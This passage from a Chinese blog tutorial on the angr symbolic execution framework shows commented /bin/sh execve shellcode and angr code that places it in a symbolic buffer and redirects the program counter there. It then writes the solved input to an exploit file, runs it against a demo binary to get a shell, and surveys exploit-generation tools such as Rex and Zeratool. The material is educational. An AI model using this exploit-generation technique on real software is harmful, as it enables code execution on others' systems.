0):</span></span><br><span class="line"><span class="comment">#     print('0x{}:\t{}\t{}'.format(i.address, i.mnemonic, i.op_str))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x0:    push    0x68          ;   h</span></span><br><span class="line"><span class="comment"># 0x2:    push    0x732f2f2f    ;   s///</span></span><br><span class="line"><span class="comment"># 0x7:    push    0x6e69622f    ;   nib/</span></span><br><span class="line"><span class="comment"># 0x12:   mov     ebx, esp      ;   ebx=/bin///sh</span></span><br><span class="line"><span class="comment"># 0x14:   xor     ecx, ecx      ;   ecx=0</span></span><br><span class="line"><span class="comment"># 0x16:   push    0xb</span></span><br><span class="line"><span class="comment"># 0x18:   pop     rax           ;   eax=sys_execve(11)</span></span><br><span class="line"><span class="comment"># 0x19:   cdq                   ;   edx=0</span></span><br><span class="line"><span class="comment"># 0x20:   int     0x80</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> buf_addr <span class="keyword">in</span> find_symbolic_buffer(ep, <span class="built_in">len</span>(shellcode)):</span><br><span class="line">    memory = ep.memory.load(buf_addr, <span class="built_in">len</span>(shellcode)) <span class="comment"># 从state.mem的buf_addr处取出len(shellcode)长度的内存</span></span><br><span class="line">    sc_bvv = ep.solver.BVV(shellcode) <span class="comment"># 转为bitvector</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 添加约束并检查是否可解</span></span><br><span class="line">    <span class="keyword">if</span> ep.satisfiable(extra_constraints=(memory == sc_bvv, ep.regs.pc == buf_addr)):</span><br><span class="line">        ep.add_constraints(memory == sc_bvv) <span class="comment"># 正式添加约束</span></span><br><span class="line">        ep.add_constraints(ep.regs.pc == buf_addr)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<ol>
<li>求解约束并将结果写入文件。</li>
</ol>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(ep.posix.dumps(<span class="number">0</span>)) <span class="comment"># 求解约束并从0（标准输入）处取出求解结果</span></span><br></pre></td></tr></table></figure>
<ol>
<li>测试exploit，可以执行shell命令，其中<code>cat -</code>表示从标准输入读取。</li>
</ol>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">(cat demo_bin-exploit; cat -) | ./demo_bin</span><br></pre></td></tr></table></figure>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li><a href="https://xz.aliyun.com/t/7117">angr 系列教程(一）核心概念及模块解读</a></li>
</ul>
<h1 id="基于Angr的工具"><a href="#基于Angr的工具" class="headerlink" title="基于Angr的工具"></a>基于Angr的工具</h1><h2 id="Driller"><a href="#Driller" class="headerlink" title="Driller"></a>Driller</h2><p><a href="https://github.com/shellphish/driller">Driller</a>是将符号执行和fuzz结合的第一个影响较大的工作，它依赖<code>afl-qemu</code>和<code>angr</code>对二进制文件进行分析，在<code>afl</code>遇到诸如<code>if</code>等检查时使用<code>angr</code>从当前样本出发进行符号执行，根据<code>missed state</code>求解产生新状态的输入，然后采用类似<code>slave</code>模式的方法将新样本合并到<code>master</code>中。其核心流程位于<code>driller_main.py</code>，逻辑非常接简洁，个人对其关键步骤做出了<a href="https://github.com/ZanderChang/myUtilities/blob/master/driller_main_analyse.py">注释</a>。</p>
<p>类似工作：<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="49.824ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 22022.1 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D437" d="M287 628Q287 635 230 637Q207 637 200 638T193 647Q193 655 197 667T204 682Q206 683 403 683Q570 682 590 682T630 676Q702 659 752 597T803 431Q803 275 696 151T444 3L430 1L236 0H125H72Q48 0 41 2T33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM703 469Q703 507 692 537T666 584T629 613T590 629T555 636Q553 636 541 636T512 636T479 637H436Q392 637 386 627Q384 623 313 339T242 52Q242 48 253 48T330 47Q335 47 349 47T373 46Q499 46 581 128Q617 164 640 212T683 339T703 469Z"></path></g><g data-mml-node="mi" transform="translate(828, 0)"><path data-c="1D45F" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(1279, 0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(1624, 0)"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z"></path></g><g data-mml-node="mi" transform="translate(1922, 0)"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z"></path></g><g data-mml-node="mi" transform="translate(2220, 0)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mi" transform="translate(2686, 0)"><path data-c="1D45F" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(3137, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(3526, 0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(500, 0)"></path><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(1000, 0)"></path><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z" transform="translate(1500, 0)"></path></g><g data-mml-node="mo" transform="translate(5526, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(6192.8, 0)"><path data-c="2192" d="M56 237T56 250T70 270H835Q719 357 692 493Q692 494 692 496T691 499Q691 511 708 511H711Q720 511 723 510T729 506T732 497T735 481T743 456Q765 389 816 336T935 261Q944 258 944 250Q944 244 939 241T915 231T877 212Q836 186 806 152T761 85T740 35T732 4Q730 -6 727 -8T711 -11Q691 -11 691 0Q691 7 696 25Q728 151 835 230H70Q56 237 56 250Z"></path></g><g data-mml-node="mi" transform="translate(7470.6, 0)"><path data-c="1D444" d="M399 -80Q399 -47 400 -30T402 -11V-7L387 -11Q341 -22 303 -22Q208 -22 138 35T51 201Q50 209 50 244Q50 346 98 438T227 601Q351 704 476 704Q514 704 524 703Q621 689 680 617T740 435Q740 255 592 107Q529 47 461 16L444 8V3Q444 2 449 -24T470 -66T516 -82Q551 -82 583 -60T625 -3Q631 11 638 11Q647 11 649 2Q649 -6 639 -34T611 -100T557 -165T481 -194Q399 -194 399 -87V-80ZM636 468Q636 523 621 564T580 625T530 655T477 665Q429 665 379 640Q277 591 215 464T153 216Q153 110 207 59Q231 38 236 38V46Q236 86 269 120T347 155Q372 155 390 144T417 114T429 82T435 55L448 64Q512 108 557 185T619 334T636 468ZM314 18Q362 18 404 39L403 49Q399 104 366 115Q354 117 347 117Q344 117 341 117T337 118Q317 118 296 98T274 52Q274 18 314 18Z"></path></g><g data-mml-node="mi" transform="translate(8261.6, 0)"><path data-c="1D446" d="M308 24Q367 24 416 76T466 197Q466 260 414 284Q308 311 278 321T236 341Q176 383 176 462Q176 523 208 573T273 648Q302 673 343 688T407 704H418H425Q521 704 564 640Q565 640 577 653T603 682T623 704Q624 704 627 704T632 705Q645 705 645 698T617 577T585 459T569 456Q549 456 549 465Q549 471 550 475Q550 478 551 494T553 520Q553 554 544 579T526 616T501 641Q465 662 419 662Q362 662 313 616T263 510Q263 480 278 458T319 427Q323 425 389 408T456 390Q490 379 522 342T554 242Q554 216 546 186Q541 164 528 137T492 78T426 18T332 -20Q320 -22 298 -22Q199 -22 144 33L134 44L106 13Q83 -14 78 -18T65 -22Q52 -22 52 -14Q52 -11 110 221Q112 227 130 227H143Q149 221 149 216Q149 214 148 207T144 186T142 153Q144 114 160 87T203 47T255 29T308 24Z"></path></g><g data-mml-node="mi" transform="translate(8906.6, 0)"><path data-c="1D44C" d="M66 637Q54 637 49 637T39 638T32 641T30 647T33 664T42 682Q44 683 56 683Q104 680 165 680Q288 680 306 683H316Q322 677 322 674T320 656Q316 643 310 637H298Q242 637 242 624Q242 619 292 477T343 333L346 336Q350 340 358 349T379 373T411 410T454 461Q546 568 561 587T577 618Q577 634 545 637Q528 637 528 647Q528 649 530 661Q533 676 535 679T549 683Q551 683 578 682T657 680Q684 680 713 681T746 682Q763 682 763 673Q763 669 760 657T755 643Q753 637 734 637Q662 632 617 587Q608 578 477 424L348 273L322 169Q295 62 295 57Q295 46 363 46Q379 46 384 45T390 35Q390 33 388 23Q384 6 382 4T366 1Q361 1 324 1T232 2Q170 2 138 2T102 1Q84 1 84 9Q84 14 87 24Q88 27 89 30T90 35T91 39T93 42T96 44T101 45T107 45T116 46T129 46Q168 47 180 50T198 63Q201 68 227 171L252 274L129 623Q128 624 127 625T125 627T122 629T118 631T113 633T105 634T96 635T83 636T66 637Z"></path></g><g data-mml-node="mi" transform="translate(9669.6, 0)"><path data-c="1D440" d="M289 629Q289 635 232 637Q208 637 201 638T194 648Q194 649 196 659Q197 662 198 666T199 671T201 676T203 679T207 681T212 683T220 683T232 684Q238 684 262 684T307 683Q386 683 398 683T414 678Q415 674 451 396L487 117L510 154Q534 190 574 254T662 394Q837 673 839 675Q840 676 842 678T846 681L852 683H948Q965 683 988 683T1017 684Q1051 684 1051 673Q1051 668 1048 656T1045 643Q1041 637 1008 637Q968 636 957 634T939 623Q936 618 867 340T797 59Q797 55 798 54T805 50T822 48T855 46H886Q892 37 892 35Q892 19 885 5Q880 0 869 0Q864 0 828 1T736 2Q675 2 644 2T609 1Q592 1 592 11Q592 13 594 25Q598 41 602 43T625 46Q652 46 685 49Q699 52 704 61Q706 65 742 207T813 490T848 631L654 322Q458 10 453 5Q451 4 449 3Q444 0 433 0Q418 0 415 7Q413 11 374 317L335 624L267 354Q200 88 200 79Q206 46 272 46H282Q288 41 289 37T286 19Q282 3 278 1Q274 0 267 0Q265 0 255 0T221 1T157 2Q127 2 95 1T58 0Q43 0 39 2T35 11Q35 13 38 25T43 40Q45 46 65 46Q135 46 154 86Q158 92 223 354T289 629Z"></path></g><g data-mml-node="mo" transform="translate(10720.6, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(11109.6, 0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(500, 0)"></path><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(1000, 0)"></path><path data-c="38" d="M70 417T70 494T124 618T248 666Q319 666 374 624T429 515Q429 485 418 459T392 417T361 389T335 371T324 363L338 354Q352 344 366 334T382 323Q457 264 457 174Q457 95 399 37T249 -22Q159 -22 101 29T43 155Q43 263 172 335L154 348Q133 361 127 368Q70 417 70 494ZM286 386L292 390Q298 394 301 396T311 403T323 413T334 425T345 438T355 454T364 471T369 491T371 513Q371 556 342 586T275 624Q268 625 242 625Q201 625 165 599T128 534Q128 511 141 492T167 463T217 431Q224 426 228 424L286 386ZM250 21Q308 21 350 55T392 137Q392 154 387 169T375 194T353 216T330 234T301 253T274 270Q260 279 244 289T218 306L210 311Q204 311 181 294T133 239T107 157Q107 98 150 60T250 21Z" transform="translate(1500, 0)"></path></g><g data-mml-node="mo" transform="translate(13109.6, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(13776.3, 0)"><path data-c="2192" d="M56 237T56 250T70 270H835Q719 357 692 493Q692 494 692 496T691 499Q691 511 708 511H711Q720 511 723 510T729 506T732 497T735 481T743 456Q765 389 816 336T935 261Q944 258 944 250Q944 244 939 241T915 231T877 212Q836 186 806 152T761 85T740 35T732 4Q730 -6 727 -8T711 -11Q691 -11 691 0Q691 7 696 25Q728 151 835 230H70Q56 237 56 250Z"></path></g><g data-mml-node="mi" transform="translate(15054.1, 0)"><path data-c="1D446" d="M308 24Q367 24 416 76T466 197Q466 260 414 284Q308 311 278 321T236 341Q176 383 176 462Q176 523 208 573T273 648Q302 673 343 688T407 704H418H425Q521 704 564 640Q565 640 577 653T603 682T623 704Q624 704 627 704T632 705Q645 705 645 698T617 577T585 459T569 456Q549 456 549 465Q549 471 550 475Q550 478 551 494T553 520Q553 554 544 579T526 616T501 641Q465 662 419 662Q362 662 313 616T263 510Q263 480 278 458T319 427Q323 425 389 408T456 390Q490 379 522 342T554 242Q554 216 546 186Q541 164 528 137T492 78T426 18T332 -20Q320 -22 298 -22Q199 -22 144 33L134 44L106 13Q83 -14 78 -18T65 -22Q52 -22 52 -14Q52 -11 110 221Q112 227 130 227H143Q149 221 149 216Q149 214 148 207T144 186T142 153Q144 114 160 87T203 47T255 29T308 24Z"></path></g><g data-mml-node="mi" transform="translate(15699.1, 0)"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g><g data-mml-node="mi" transform="translate(16449.1, 0)"><path data-c="1D449" d="M52 648Q52 670 65 683H76Q118 680 181 680Q299 680 320 683H330Q336 677 336 674T334 656Q329 641 325 637H304Q282 635 274 635Q245 630 242 620Q242 618 271 369T301 118L374 235Q447 352 520 471T595 594Q599 601 599 609Q599 633 555 637Q537 637 537 648Q537 649 539 661Q542 675 545 679T558 683Q560 683 570 683T604 682T668 681Q737 681 755 683H762Q769 676 769 672Q769 655 760 640Q757 637 743 637Q730 636 719 635T698 630T682 623T670 615T660 608T652 599T645 592L452 282Q272 -9 266 -16Q263 -18 259 -21L241 -22H234Q216 -22 216 -15Q213 -9 177 305Q139 623 138 626Q133 637 76 637H59Q52 642 52 648Z"></path></g><g data-mml-node="mi" transform="translate(17218.1, 0)"><path data-c="1D43C" d="M43 1Q26 1 26 10Q26 12 29 24Q34 43 39 45Q42 46 54 46H60Q120 46 136 53Q137 53 138 54Q143 56 149 77T198 273Q210 318 216 344Q286 624 286 626Q284 630 284 631Q274 637 213 637H193Q184 643 189 662Q193 677 195 680T209 683H213Q285 681 359 681Q481 681 487 683H497Q504 676 504 672T501 655T494 639Q491 637 471 637Q440 637 407 634Q393 631 388 623Q381 609 337 432Q326 385 315 341Q245 65 245 59Q245 52 255 50T307 46H339Q345 38 345 37T342 19Q338 6 332 0H316Q279 2 179 2Q143 2 113 2T65 2T43 1Z"></path></g><g data-mml-node="mi" transform="translate(17722.1, 0)"><path data-c="1D442" d="M740 435Q740 320 676 213T511 42T304 -22Q207 -22 138 35T51 201Q50 209 50 244Q50 346 98 438T227 601Q351 704 476 704Q514 704 524 703Q621 689 680 617T740 435ZM637 476Q637 565 591 615T476 665Q396 665 322 605Q242 542 200 428T157 216Q157 126 200 73T314 19Q404 19 485 98T608 313Q637 408 637 476Z"></path></g><g data-mml-node="mi" transform="translate(18485.1, 0)"><path data-c="1D445" d="M230 637Q203 637 198 638T193 649Q193 676 204 682Q206 683 378 683Q550 682 564 680Q620 672 658 652T712 606T733 563T739 529Q739 484 710 445T643 385T576 351T538 338L545 333Q612 295 612 223Q612 212 607 162T602 80V71Q602 53 603 43T614 25T640 16Q668 16 686 38T712 85Q717 99 720 102T735 105Q755 105 755 93Q755 75 731 36Q693 -21 641 -21H632Q571 -21 531 4T487 82Q487 109 502 166T517 239Q517 290 474 313Q459 320 449 321T378 323H309L277 193Q244 61 244 59Q244 55 245 54T252 50T269 48T302 46H333Q339 38 339 37T336 19Q332 6 326 0H311Q275 2 180 2Q146 2 117 2T71 2T50 1Q33 1 33 10Q33 12 36 24Q41 43 46 45Q50 46 61 46H67Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628Q287 635 230 637ZM630 554Q630 586 609 608T523 636Q521 636 500 636T462 637H440Q393 637 386 627Q385 624 352 494T319 361Q319 360 388 360Q466 361 492 367Q556 377 592 426Q608 449 619 486T630 554Z"></path></g><g data-mml-node="mo" transform="translate(19244.1, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(19633.1, 0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(500, 0)"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(1000, 0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(1500, 0)"></path></g><g data-mml-node="mo" transform="translate(21633.1, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>，其中<code>QSYM</code>基于<code>kAFL</code>开发，同样依赖于<code>intel-pt</code>，<code>SAVIOR</code>目前未开源。</p>
<ul>
<li><a href="https://www.jianshu.com/p/6e3943474f41">Driller的安装与使用</a></li>
</ul>
<h2 id="Rex"><a href="#Rex" class="headerlink" title="Rex"></a>Rex</h2><p>将应用程序及导致应用程序崩溃的PoC作为系统输入，判断PoC的可利用性，自动生成Exploit并导出。</p>
<ul>
<li><a href="https://xz.aliyun.com/t/7179">Rex: 自动化利用引擎分析</a></li>
<li><a href="https://ma3k4h3d.top/2019/01/23/rex-crash/">Rex：源码分析 — Crash Analysis</a></li>
<li><a href="https://www.freebuf.com/articles/system/197392.html">Exploit自动生成引擎：Rex</a></li>
</ul>
<h2 id="Zeratool"><a href="#Zeratool" class="headerlink" title="Zeratool"></a>Zeratool</h2><p>针对栈溢出漏洞和格式化字符串漏洞进行自动攻击。</p>
<p>（代码逻辑比较清晰，可以考虑fork出来用angr8来修补一遍）</p>
<ul>
<li><a href="https://xz.aliyun.com/t/7224">zeratool：基于 angr 的CTF pwn 自动化利用工具介绍</a></li>
</ul>
]]></content>
      <categories>
        <category>符号执行</category>
      </categories>
      <tags>
        <tag>angr</tag>
      </tags>
  </entry>
</search>
